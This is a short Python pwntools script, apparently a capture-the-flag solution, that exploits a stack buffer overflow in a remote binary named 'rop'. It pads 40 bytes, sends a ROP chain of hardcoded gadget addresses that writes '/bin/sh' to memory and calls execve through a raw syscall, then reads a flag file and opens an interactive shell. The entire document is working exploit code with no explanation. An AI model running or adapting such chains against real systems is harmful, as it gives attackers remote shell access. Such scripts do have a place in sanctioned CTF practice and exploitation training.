from pwn import *
import time
context.arch = 'amd64'
local = False
if local:
    r = process('./rop')
else:
    r = remote('140.115.59.7', 11005)
# ret will pop rip
mov_prax_rdx = 0x00000000004449be
pop_rax = 0x000000000046b408
pop_rdx = 0x00000000004371d5
pop_rdi = 0x0000000000401693
pop_rsi = 0x00000000004017a7
sh_write_to_heap = 0x6c3000
syscall = 0x000000000045b4c5

rop = flat([pop_rdx, "/bin/sh\x00", pop_rax, sh_write_to_heap, mov_prax_rdx, pop_rax, 0x3b, pop_rdi, sh_write_to_heap, pop_rsi, 0, pop_rdx, 0, syscall])

payload = 'a' * 40 + rop
r.sendline(payload)
time.sleep(1)
r.sendline('cat /home/rop/flag')
r.interactive()
